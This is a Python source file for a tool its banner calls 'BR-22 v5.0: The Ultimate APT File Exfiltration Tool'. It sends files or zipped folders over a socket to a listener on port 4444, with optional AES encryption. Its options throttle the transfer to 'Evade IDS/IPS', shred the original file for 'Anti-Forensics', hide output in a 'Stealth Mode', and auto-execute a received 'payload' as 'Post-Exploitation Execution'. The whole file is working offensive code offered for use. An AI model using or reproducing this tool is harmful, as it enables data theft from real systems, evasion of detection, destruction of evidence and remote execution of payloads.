#!/usr/bin/env python3
import socket
import os
import sys
import zipfile
import hashlib
import argparse
import time
import subprocess
from tqdm import tqdm
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

DEFAULT_PORT = 4444
DEFAULT_BUFFER = 64

def derive_key(password):
    return hashlib.sha256(password.encode()).digest()

def get_cipher(key, iv):
    return Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())

def calculate_md5(file_path):
    hash_md5 = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def secure_shred(file_path, quiet):
    """Overwrites file with null bytes before deletion (Anti-Forensics)"""
    if not quiet: print(f"[*] Shredding original file '{file_path}' to prevent recovery...")
    filesize = os.path.getsize(file_path)
    with open(file_path, "ba+") as f:
        f.seek(0)
        f.write(os.urandom(filesize))
    os.remove(file_path)
    if not quiet: print("[+] File securely shredded.")

def prepare_target(target_path, quiet):
    if os.path.isfile(target_path):
        return target_path, False
    
    if not quiet: print(f"[*] Compressing folder '{target_path}'...")
    zip_name = f"{os.path.basename(os.path.normpath(target_path))}.zip"
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(target_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, start=target_path))
    return zip_name, True

def send_data(args):
    buffer_size = args.buffer * 1024
    file_to_send, is_zipped = prepare_target(args.target, args.quiet)
    
    if not os.path.exists(file_to_send):
        print("[-] Target not found.")
        return

    filesize = os.path.getsize(file_to_send)
    file_md5 = calculate_md5(file_to_send)

    s = socket.socket()
    if not args.quiet: print(f"[*] Establishing connection to {args.ip}:{args.port}...")
    try:
        s.connect((args.ip, args.port))
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return

    metadata = f"{os.path.basename(file_to_send)}|{filesize}|{file_md5}|{is_zipped}"
    padded_metadata = metadata.ljust(512, ' ').encode()

    if args.password:
        if not args.quiet: print("[*] Mode: ENCRYPTED (AES-256)")
        s.send(b'1')
        key = derive_key(args.password)
        iv = os.urandom(16)
        s.send(iv)
        encryptor = get_cipher(key, iv).encryptor()
        s.send(encryptor.update(padded_metadata))
    else:
        if not args.quiet: print("[*] Mode: PLAINTEXT (Fast Transfer)")
        s.send(b'0')
        s.send(padded_metadata)

    progress = None
    if not args.quiet:
        progress = tqdm(range(filesize), f"Sending", unit="B", unit_scale=True, unit_divisor=1024)
    
    throttle_delay = 0
    if args.throttle:
        throttle_delay = buffer_size / (args.throttle * 1024)
        if not args.quiet: print(f"[*] Throttle Enabled: Limiting to {args.throttle} KB/s")

    with open(file_to_send, "rb") as f:
        while True:
            start_time = time.time()
            bytes_read = f.read(buffer_size)
            if not bytes_read:
                break
            
            if args.password:
                s.sendall(encryptor.update(bytes_read))
            else:
                s.sendall(bytes_read)
                
            if progress: progress.update(len(bytes_read))
            
            # Anti-IDS Throttling Logic
            if args.throttle:
                elapsed = time.time() - start_time
                if elapsed < throttle_delay:
                    time.sleep(throttle_delay - elapsed)
    
    s.close()
    if is_zipped: os.remove(file_to_send)
    if not args.quiet: print("\n[+] Transfer Complete!")

    if args.shred and not is_zipped:
        secure_shred(args.target, args.quiet)

def receive_data(args):
    buffer_size = args.buffer * 1024
    s = socket.socket()
    s.bind(("0.0.0.0", args.port))
    s.listen(1)
    
    if not args.quiet: print(f"[*] Server listening on port {args.port}...")
    
    client_socket, address = s.accept()
    if not args.quiet: print(f"[+] Connection received from {address[0]}")

    is_encrypted = client_socket.recv(1) == b'1'

    if is_encrypted:
        if not args.password:
            print("\n[-] ERROR: Sender used a password, but you didn't provide one to decrypt!")
            client_socket.close()
            s.close()
            return
            
        key = derive_key(args.password)
        iv = client_socket.recv(16)
        decryptor = get_cipher(key, iv).decryptor()
        enc_metadata = client_socket.recv(512)
        dec_metadata = decryptor.update(enc_metadata).decode('utf-8', errors='ignore').strip()
    else:
        if args.password:
            print("\n[-] WARNING: Sender sent PLAINTEXT. Ignoring password.")
        dec_metadata = client_socket.recv(512).decode('utf-8', errors='ignore').strip()
    
    try:
        filename, filesize, original_md5, is_zipped = dec_metadata.split('|')
        filesize = int(filesize)
        is_zipped = is_zipped == "True"
    except:
        print("\n[-] FATAL ERROR: Corrupted Data or Incorrect Password.")
        client_socket.close()
        s.close()
        return

    progress = None
    if not args.quiet:
        progress = tqdm(range(filesize), f"Receiving", unit="B", unit_scale=True, unit_divisor=1024)
        
    with open(filename, "wb") as f:
        received_bytes = 0
        while received_bytes < filesize:
            chunk = client_socket.recv(buffer_size)
            if not chunk:
                break
                
            if is_encrypted:
                f.write(decryptor.update(chunk))
            else:
                f.write(chunk)
                
            received_bytes += len(chunk)
            if progress: progress.update(len(chunk))
            
    client_socket.close()
    s.close()
    
    if calculate_md5(filename) == original_md5:
        if not args.quiet: print("\n[+] Integrity Verified: File received successfully.")
    else:
        print("\n[-] WARNING: File Corrupted during transfer!")
        
    if is_zipped:
        extract_dir = filename.replace('.zip', '')
        with zipfile.ZipFile(filename, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        os.remove(filename)
        if not args.quiet: print(f"[+] Payload extracted to '{extract_dir}'")
        filename = extract_dir # update reference if needed for execution

    # Post-Exploitation Execution
    if args.execute and not is_zipped:
        if not args.quiet: print(f"[*] Post-Transfer Execution: Running {filename}...")
        try:
            os.chmod(filename, 0o777)  # Give execute permissions in Linux
            subprocess.Popen(f"./{filename}" if os.name != 'nt' else filename, shell=True)
            if not args.quiet: print("[+] Payload Executed Successfully!")
        except Exception as e:
            print(f"[-] Execution Failed: {e}")

def main():
    # Clean Raw String Banner (No warnings)
    banner = r"""
  ____  ____       ___  ___  
 | __ )|  _ \     |__ \|__ \ 
 |  _ \| |_) |_____ / /  / / 
 | |_) |  _ <_____|/ /_ / /_ 
 |____/|_| \_\    /____/____|
                             
    BR-22 v5.0: The Ultimate APT File Exfiltration Tool
    """
    
    # Handle 'help' smoothly before argparse crashes
    if len(sys.argv) == 1 or (len(sys.argv) == 2 and sys.argv[1].lower() in ["help", "-h", "--help"]):
        print(banner)
        print("Usage:")
        print("  Receiver: python3 br22.py -m receive [--password SecretKey] [--execute]")
        print("  Sender:   python3 br22.py -m send -t payload.exe -i 192.168.1.10 [--password SecretKey] [--shred] [--throttle 500]")
        print("\nRun 'python3 br22.py -h' for advanced options.")
        sys.exit(0)

    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, description=banner)

    core = parser.add_argument_group('Core Options')
    core.add_argument("-m", "--mode", choices=["send", "receive"], required=True, help="Set operation mode (send / receive)")
    core.add_argument("--password", required=False, help="Optional: Authentication Key for AES-256 Encryption")
    
    target = parser.add_argument_group('Target Options')
    target.add_argument("-t", "--target", help="File/Folder path to send (Required if mode=send)")
    target.add_argument("-i", "--ip", help="Target IP Address (Required if mode=send)")
    target.add_argument("-p", "--port", type=int, default=4444, help="Target/Bind Port (Default: 4444)")
    
    adv = parser.add_argument_group('Advanced Multi-Level Features (APT)')
    adv.add_argument("--shred", action="store_true", help="(Sender) Securely overwrite and delete the original file after sending")
    adv.add_argument("--throttle", type=int, help="(Sender) Limit transfer speed in KB/s (Evade IDS/IPS)")
    adv.add_argument("--execute", action="store_true", help="(Receiver) Auto-execute the file upon successful receipt")
    
    tune = parser.add_argument_group('Performance & Stealth')
    tune.add_argument("-b", "--buffer", type=int, default=64, help="Buffer size in KB (Default: 64)")
    tune.add_argument("-q", "--quiet", action="store_true", help="Stealth Mode: Hide standard output and progress bar")

    args = parser.parse_args()

    if args.mode == "send":
        if not args.target or not args.ip:
            parser.error("Sender mode requires --target (-t) and --ip (-i)")
        send_data(args)
    elif args.mode == "receive":
        receive_data(args)

if __name__ == "__main__":
    main()
